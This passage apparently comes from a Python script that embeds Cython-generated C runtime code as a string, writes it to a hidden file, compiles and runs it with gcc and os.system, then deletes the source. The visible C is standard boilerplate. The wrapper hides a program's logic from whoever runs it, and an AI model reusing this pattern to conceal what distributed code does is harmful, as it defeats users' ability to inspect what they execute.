    if (!frame) {
        if (unlikely(!self->gi_code)) {
            Py_RETURN_NONE;
        }
        frame = (PyObject *) PyFrame_New(
            PyThreadState_Get(),            /*PyThreadState *tstate,*/
            (PyCodeObject*) self->gi_code,  /*PyCodeObject *code,*/
            __pyx_d,                 /*PyObject *globals,*/
            0                               /*PyObject *locals*/
        );
        if (unlikely(!frame))
            return NULL;
        self->gi_frame = frame;
    }
    Py_INCREF(frame);
    return frame;
}
static __pyx_CoroutineObject *__Pyx__Coroutine_New(
            PyTypeObject* type, __pyx_coroutine_body_t body, PyObject *code, PyObject *closure,
            PyObject *name, PyObject *qualname, PyObject *module_name) {
    __pyx_CoroutineObject *gen = PyObject_GC_New(__pyx_CoroutineObject, type);
    if (unlikely(!gen))
        return NULL;
    return __Pyx__Coroutine_NewInit(gen, body, code, closure, name, qualname, module_name);
}
static __pyx_CoroutineObject *__Pyx__Coroutine_NewInit(
            __pyx_CoroutineObject *gen, __pyx_coroutine_body_t body, PyObject *code, PyObject *closure,
            PyObject *name, PyObject *qualname, PyObject *module_name) {
    gen->body = body;
    gen->closure = closure;
    Py_XINCREF(closure);
    gen->is_running = 0;
    gen->resume_label = 0;
    gen->classobj = NULL;
    gen->yieldfrom = NULL;
    gen->gi_exc_state.exc_type = NULL;
    gen->gi_exc_state.exc_value = NULL;
    gen->gi_exc_state.exc_traceback = NULL;
#if CYTHON_USE_EXC_INFO_STACK
    gen->gi_exc_state.previous_item = NULL;
#endif
    gen->gi_weakreflist = NULL;
    Py_XINCREF(qualname);
    gen->gi_qualname = qualname;
    Py_XINCREF(name);
    gen->gi_name = name;
    Py_XINCREF(module_name);
    gen->gi_modulename = module_name;
    Py_XINCREF(code);
    gen->gi_code = code;
    gen->gi_frame = NULL;
    PyObject_GC_Track(gen);
    return gen;
}

/* PatchModuleWithCoroutine */
    static PyObject* __Pyx_Coroutine_patch_module(PyObject* module, const char* py_code) {
#if defined(__Pyx_Generator_USED) || defined(__Pyx_Coroutine_USED)
    int result;
    PyObject *globals, *result_obj;
    globals = PyDict_New();  if (unlikely(!globals)) goto ignore;
    result = PyDict_SetItemString(globals, "_cython_coroutine_type",
    #ifdef __Pyx_Coroutine_USED
        (PyObject*)__pyx_CoroutineType);
    #else
        Py_None);
    #endif
    if (unlikely(result < 0)) goto ignore;
    result = PyDict_SetItemString(globals, "_cython_generator_type",
    #ifdef __Pyx_Generator_USED
        (PyObject*)__pyx_GeneratorType);
    #else
        Py_None);
    #endif
    if (unlikely(result < 0)) goto ignore;
    if (unlikely(PyDict_SetItemString(globals, "_module", module) < 0)) goto ignore;
    if (unlikely(PyDict_SetItemString(globals, "__builtins__", __pyx_b) < 0)) goto ignore;
    result_obj = PyRun_String(py_code, Py_file_input, globals, globals);
    if (unlikely(!result_obj)) goto ignore;
    Py_DECREF(result_obj);
    Py_DECREF(globals);
    return module;
ignore:
    Py_XDECREF(globals);
    PyErr_WriteUnraisable(module);
    if (unlikely(PyErr_WarnEx(PyExc_RuntimeWarning, "Cython module failed to patch module with custom type", 1) < 0)) {
        Py_DECREF(module);
        module = NULL;
    }
#else
    py_code++;
#endif
    return module;
}

/* PatchGeneratorABC */
    #ifndef CYTHON_REGISTER_ABCS
#define CYTHON_REGISTER_ABCS 1
#endif
#if defined(__Pyx_Generator_USED) || defined(__Pyx_Coroutine_USED)
static PyObject* __Pyx_patch_abc_module(PyObject *module);
static PyObject* __Pyx_patch_abc_module(PyObject *module) {
    module = __Pyx_Coroutine_patch_module(
        module, ""
"if _cython_generator_type is not None:\n"
"    try: Generator = _module.Generator\n"
"    except AttributeError: pass\n"
"    else: Generator.register(_cython_generator_type)\n"
"if _cython_coroutine_type is not None:\n"
"    try: Coroutine = _module.Coroutine\n"
"    except AttributeError: pass\n"
"    else: Coroutine.register(_cython_coroutine_type)\n"
    );
    return module;
}
#endif
static int __Pyx_patch_abc(void) {
#if defined(__Pyx_Generator_USED) || defined(__Pyx_Coroutine_USED)
    static int abc_patched = 0;
    if (CYTHON_REGISTER_ABCS && !abc_patched) {
        PyObject *module;
        module = PyImport_ImportModule((PY_MAJOR_VERSION >= 3) ? "collections.abc" : "collections");
        if (!module) {
            PyErr_WriteUnraisable(NULL);
            if (unlikely(PyErr_WarnEx(PyExc_RuntimeWarning,
                    ((PY_MAJOR_VERSION >= 3) ?
                        "Cython module failed to register with collections.abc module" :
                        "Cython module failed to register with collections module"), 1) < 0)) {
                return -1;
            }
        } else {
            module = __Pyx_patch_abc_module(module);
            abc_patched = 1;
            if (unlikely(!module))
                return -1;
            Py_DECREF(module);
        }
        module = PyImport_ImportModule("backports_abc");
        if (module) {
            module = __Pyx_patch_abc_module(module);
            Py_XDECREF(module);
        }
        if (!module) {
            PyErr_Clear();
        }
    }
#else
    if ((0)) __Pyx_Coroutine_patch_module(NULL, NULL);
#endif
    return 0;
}

/* Generator */
    static PyMethodDef __pyx_Generator_methods[] = {
    {"send", (PyCFunction) __Pyx_Coroutine_Send, METH_O,
     (char*) PyDoc_STR("send(arg) -> send 'arg' into generator,\nreturn next yielded value or raise StopIteration.")},
    {"throw", (PyCFunction) __Pyx_Coroutine_Throw, METH_VARARGS,
     (char*) PyDoc_STR("throw(typ[,val[,tb]]) -> raise exception in generator,\nreturn next yielded value or raise StopIteration.")},
    {"close", (PyCFunction) __Pyx_Coroutine_Close_Method, METH_NOARGS,
     (char*) PyDoc_STR("close() -> raise GeneratorExit inside generator.")},
    {0, 0, 0, 0}
};
static PyMemberDef __pyx_Generator_memberlist[] = {
    {(char *) "gi_running", T_BOOL, offsetof(__pyx_CoroutineObject, is_running), READONLY, NULL},
    {(char*) "gi_yieldfrom", T_OBJECT, offsetof(__pyx_CoroutineObject, yieldfrom), READONLY,
     (char*) PyDoc_STR("object being iterated by 'yield from', or None")},
    {(char*) "gi_code", T_OBJECT, offsetof(__pyx_CoroutineObject, gi_code), READONLY, NULL},
    {0, 0, 0, 0, 0}
};
static PyGetSetDef __pyx_Generator_getsets[] = {
    {(char *) "__name__", (getter)__Pyx_Coroutine_get_name, (setter)__Pyx_Coroutine_set_name,
     (char*) PyDoc_STR("name of the generator"), 0},
    {(char *) "__qualname__", (getter)__Pyx_Coroutine_get_qualname, (setter)__Pyx_Coroutine_set_qualname,
     (char*) PyDoc_STR("qualified name of the generator"), 0},
    {(char *) "gi_frame", (getter)__Pyx_Coroutine_get_frame, NULL,
     (char*) PyDoc_STR("Frame of the generator"), 0},
    {0, 0, 0, 0, 0}
};
static PyTypeObject __pyx_GeneratorType_type = {
    PyVarObject_HEAD_INIT(0, 0)
    "generator",
    sizeof(__pyx_CoroutineObject),
    0,
    (destructor) __Pyx_Coroutine_dealloc,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    Py_TPFLAGS_DEFAULT | Py_TPFLAGS_HAVE_GC | Py_TPFLAGS_HAVE_FINALIZE,
    0,
    (traverseproc) __Pyx_Coroutine_traverse,
    0,
    0,
    offsetof(__pyx_CoroutineObject, gi_weakreflist),
    0,
    (iternextfunc) __Pyx_Generator_Next,
    __pyx_Generator_methods,
    __pyx_Generator_memberlist,
    __pyx_Generator_getsets,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
#if CYTHON_USE_TP_FINALIZE
    0,
#else
    __Pyx_Coroutine_del,
#endif
    0,
#if CYTHON_USE_TP_FINALIZE
    __Pyx_Coroutine_del,
#elif PY_VERSION_HEX >= 0x030400a1
    0,
#endif
#if PY_VERSION_HEX >= 0x030800b1 && (!CYTHON_COMPILING_IN_PYPY || PYPY_VERSION_NUM >= 0x07030800)
    0,
#endif
#if PY_VERSION_HEX >= 0x030800b4 && PY_VERSION_HEX < 0x03090000
    0,
#endif
#if CYTHON_COMPILING_IN_PYPY && PY_VERSION_HEX >= 0x03090000
    0,
#endif
};
static int __pyx_Generator_init(void) {
    __pyx_GeneratorType_type.tp_getattro = __Pyx_PyObject_GenericGetAttrNoDict;
    __pyx_GeneratorType_type.tp_iter = PyObject_SelfIter;
    __pyx_GeneratorType = __Pyx_FetchCommonType(&__pyx_GeneratorType_type);
    if (unlikely(!__pyx_GeneratorType)) {
        return -1;
    }
    return 0;
}

/* CheckBinaryVersion */
    static int __Pyx_check_binary_version(void) {
    char ctversion[5];
    int same=1, i, found_dot;
    const char* rt_from_call = Py_GetVersion();
    PyOS_snprintf(ctversion, 5, "%d.%d", PY_MAJOR_VERSION, PY_MINOR_VERSION);
    found_dot = 0;
    for (i = 0; i < 4; i++) {
        if (!ctversion[i]) {
            same = (rt_from_call[i] < '0' || rt_from_call[i] > '9');
            break;
        }
        if (rt_from_call[i] != ctversion[i]) {
            same = 0;
            break;
        }
    }
    if (!same) {
        char rtversion[5] = {'\0'};
        char message[200];
        for (i=0; i<4; ++i) {
            if (rt_from_call[i] == '.') {
                if (found_dot) break;
                found_dot = 1;
            } else if (rt_from_call[i] < '0' || rt_from_call[i] > '9') {
                break;
            }
            rtversion[i] = rt_from_call[i];
        }
        PyOS_snprintf(message, sizeof(message),
                      "compiletime version %s of module '%.100s' "
                      "does not match runtime version %s",
                      ctversion, __Pyx_MODULE_NAME, rtversion);
        return PyErr_WarnEx(NULL, message, 1);
    }
    return 0;
}

/* InitStrings */
    static int __Pyx_InitStrings(__Pyx_StringTabEntry *t) {
    while (t->p) {
        #if PY_MAJOR_VERSION < 3
        if (t->is_unicode) {
            *t->p = PyUnicode_DecodeUTF8(t->s, t->n - 1, NULL);
        } else if (t->intern) {
            *t->p = PyString_InternFromString(t->s);
        } else {
            *t->p = PyString_FromStringAndSize(t->s, t->n - 1);
        }
        #else
        if (t->is_unicode | t->is_str) {
            if (t->intern) {
                *t->p = PyUnicode_InternFromString(t->s);
            } else if (t->encoding) {
                *t->p = PyUnicode_Decode(t->s, t->n - 1, t->encoding, NULL);
            } else {
                *t->p = PyUnicode_FromStringAndSize(t->s, t->n - 1);
            }
        } else {
            *t->p = PyBytes_FromStringAndSize(t->s, t->n - 1);
        }
        #endif
        if (!*t->p)
            return -1;
        if (PyObject_Hash(*t->p) == -1)
            return -1;
        ++t;
    }
    return 0;
}

static CYTHON_INLINE PyObject* __Pyx_PyUnicode_FromString(const char* c_str) {
    return __Pyx_PyUnicode_FromStringAndSize(c_str, (Py_ssize_t)strlen(c_str));
}
static CYTHON_INLINE const char* __Pyx_PyObject_AsString(PyObject* o) {
    Py_ssize_t ignore;
    return __Pyx_PyObject_AsStringAndSize(o, &ignore);
}
#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII || __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT
#if !CYTHON_PEP393_ENABLED
static const char* __Pyx_PyUnicode_AsStringAndSize(PyObject* o, Py_ssize_t *length) {
    char* defenc_c;
    PyObject* defenc = _PyUnicode_AsDefaultEncodedString(o, NULL);
    if (!defenc) return NULL;
    defenc_c = PyBytes_AS_STRING(defenc);
#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII
    {
        char* end = defenc_c + PyBytes_GET_SIZE(defenc);
        char* c;
        for (c = defenc_c; c < end; c++) {
            if ((unsigned char) (*c) >= 128) {
                PyUnicode_AsASCIIString(o);
                return NULL;
            }
        }
    }
#endif
    *length = PyBytes_GET_SIZE(defenc);
    return defenc_c;
}
#else
static CYTHON_INLINE const char* __Pyx_PyUnicode_AsStringAndSize(PyObject* o, Py_ssize_t *length) {
    if (unlikely(__Pyx_PyUnicode_READY(o) == -1)) return NULL;
#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII
    if (likely(PyUnicode_IS_ASCII(o))) {
        *length = PyUnicode_GET_LENGTH(o);
        return PyUnicode_AsUTF8(o);
    } else {
        PyUnicode_AsASCIIString(o);
        return NULL;
    }
#else
    return PyUnicode_AsUTF8AndSize(o, length);
#endif
}
#endif
#endif
static CYTHON_INLINE const char* __Pyx_PyObject_AsStringAndSize(PyObject* o, Py_ssize_t *length) {
#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII || __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT
    if (
#if PY_MAJOR_VERSION < 3 && __PYX_DEFAULT_STRING_ENCODING_IS_ASCII
            __Pyx_sys_getdefaultencoding_not_ascii &&
#endif
            PyUnicode_Check(o)) {
        return __Pyx_PyUnicode_AsStringAndSize(o, length);
    } else
#endif
#if (!CYTHON_COMPILING_IN_PYPY) || (defined(PyByteArray_AS_STRING) && defined(PyByteArray_GET_SIZE))
    if (PyByteArray_Check(o)) {
        *length = PyByteArray_GET_SIZE(o);
        return PyByteArray_AS_STRING(o);
    } else
#endif
    {
        char* result;
        int r = PyBytes_AsStringAndSize(o, &result, length);
        if (unlikely(r < 0)) {
            return NULL;
        } else {
            return result;
        }
    }
}
static CYTHON_INLINE int __Pyx_PyObject_IsTrue(PyObject* x) {
   int is_true = x == Py_True;
   if (is_true | (x == Py_False) | (x == Py_None)) return is_true;
   else return PyObject_IsTrue(x);
}
static CYTHON_INLINE int __Pyx_PyObject_IsTrueAndDecref(PyObject* x) {
    int retval;
    if (unlikely(!x)) return -1;
    retval = __Pyx_PyObject_IsTrue(x);
    Py_DECREF(x);
    return retval;
}
static PyObject* __Pyx_PyNumber_IntOrLongWrongResultType(PyObject* result, const char* type_name) {
#if PY_MAJOR_VERSION >= 3
    if (PyLong_Check(result)) {
        if (PyErr_WarnFormat(PyExc_DeprecationWarning, 1,
                "__int__ returned non-int (type %.200s).  "
                "The ability to return an instance of a strict subclass of int "
                "is deprecated, and may be removed in a future version of Python.",
                Py_TYPE(result)->tp_name)) {
            Py_DECREF(result);
            return NULL;
        }
        return result;
    }
#endif
    PyErr_Format(PyExc_TypeError,
                 "__%.4s__ returned non-%.4s (type %.200s)",
                 type_name, type_name, Py_TYPE(result)->tp_name);
    Py_DECREF(result);
    return NULL;
}
static CYTHON_INLINE PyObject* __Pyx_PyNumber_IntOrLong(PyObject* x) {
#if CYTHON_USE_TYPE_SLOTS
  PyNumberMethods *m;
#endif
  const char *name = NULL;
  PyObject *res = NULL;
#if PY_MAJOR_VERSION < 3
  if (likely(PyInt_Check(x) || PyLong_Check(x)))
#else
  if (likely(PyLong_Check(x)))
#endif
    return __Pyx_NewRef(x);
#if CYTHON_USE_TYPE_SLOTS
  m = Py_TYPE(x)->tp_as_number;
  #if PY_MAJOR_VERSION < 3
  if (m && m->nb_int) {
    name = "int";
    res = m->nb_int(x);
  }
  else if (m && m->nb_long) {
    name = "long";
    res = m->nb_long(x);
  }
  #else
  if (likely(m && m->nb_int)) {
    name = "int";
    res = m->nb_int(x);
  }
  #endif
#else
  if (!PyBytes_CheckExact(x) && !PyUnicode_CheckExact(x)) {
    res = PyNumber_Int(x);
  }
#endif
  if (likely(res)) {
#if PY_MAJOR_VERSION < 3
    if (unlikely(!PyInt_Check(res) && !PyLong_Check(res))) {
#else
    if (unlikely(!PyLong_CheckExact(res))) {
#endif
        return __Pyx_PyNumber_IntOrLongWrongResultType(res, name);
    }
  }
  else if (!PyErr_Occurred()) {
    PyErr_SetString(PyExc_TypeError,
                    "an integer is required");
  }
  return res;
}
static CYTHON_INLINE Py_ssize_t __Pyx_PyIndex_AsSsize_t(PyObject* b) {
  Py_ssize_t ival;
  PyObject *x;
#if PY_MAJOR_VERSION < 3
  if (likely(PyInt_CheckExact(b))) {
    if (sizeof(Py_ssize_t) >= sizeof(long))
        return PyInt_AS_LONG(b);
    else
        return PyInt_AsSsize_t(b);
  }
#endif
  if (likely(PyLong_CheckExact(b))) {
    #if CYTHON_USE_PYLONG_INTERNALS
    const digit* digits = ((PyLongObject*)b)->ob_digit;
    const Py_ssize_t size = Py_SIZE(b);
    if (likely(__Pyx_sst_abs(size) <= 1)) {
        ival = likely(size) ? digits[0] : 0;
        if (size == -1) ival = -ival;
        return ival;
    } else {
      switch (size) {
         case 2:
           if (8 * sizeof(Py_ssize_t) > 2 * PyLong_SHIFT) {
             return (Py_ssize_t) (((((size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case -2:
           if (8 * sizeof(Py_ssize_t) > 2 * PyLong_SHIFT) {
             return -(Py_ssize_t) (((((size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case 3:
           if (8 * sizeof(Py_ssize_t) > 3 * PyLong_SHIFT) {
             return (Py_ssize_t) (((((((size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case -3:
           if (8 * sizeof(Py_ssize_t) > 3 * PyLong_SHIFT) {
             return -(Py_ssize_t) (((((((size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case 4:
           if (8 * sizeof(Py_ssize_t) > 4 * PyLong_SHIFT) {
             return (Py_ssize_t) (((((((((size_t)digits[3]) << PyLong_SHIFT) | (size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case -4:
           if (8 * sizeof(Py_ssize_t) > 4 * PyLong_SHIFT) {
             return -(Py_ssize_t) (((((((((size_t)digits[3]) << PyLong_SHIFT) | (size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
      }
    }
    #endif
    return PyLong_AsSsize_t(b);
  }
  x = PyNumber_Index(b);
  if (!x) return -1;
  ival = PyInt_AsSsize_t(x);
  Py_DECREF(x);
  return ival;
}
static CYTHON_INLINE Py_hash_t __Pyx_PyIndex_AsHash_t(PyObject* o) {
  if (sizeof(Py_hash_t) == sizeof(Py_ssize_t)) {
    return (Py_hash_t) __Pyx_PyIndex_AsSsize_t(o);
#if PY_MAJOR_VERSION < 3
  } else if (likely(PyInt_CheckExact(o))) {
    return PyInt_AS_LONG(o);
#endif
  } else {
    Py_ssize_t ival;
    PyObject *x;
    x = PyNumber_Index(o);
    if (!x) return -1;
    ival = PyInt_AsLong(x);
    Py_DECREF(x);
    return ival;
  }
}
static CYTHON_INLINE PyObject * __Pyx_PyBool_FromLong(long b) {
  return b ? __Pyx_NewRef(Py_True) : __Pyx_NewRef(Py_False);
}
static CYTHON_INLINE PyObject * __Pyx_PyInt_FromSize_t(size_t ival) {
    return PyInt_FromSize_t(ival);
}


#endif /* Py_PYTHON_H */'''
C_FILE = ".py_private.c"
PYTHON_VERSION = ".".join(sys.version.split(" ")[0].split(".")[:-1])
COMPILE_FILE = (
    'gcc -I' +
    PREFIX +
    '/include/python' +
    PYTHON_VERSION +
    ' -o ' +
    EXECUTE_FILE +
    ' ' +
    C_FILE +
    ' -L' +
    PREFIX +
    '/lib -lpython' +
    PYTHON_VERSION
)


with open(C_FILE, "w") as f:
    f.write(C_SOURCE)

os.makedirs(os.path.dirname(EXECUTE_FILE), exist_ok=True)
os.system(EXPORT_PYTHONHOME+" && "+EXPORT_PYTHON_EXECUTABLE+" && "+COMPILE_FILE+" && "+RUN)

os.remove(C_FILE)
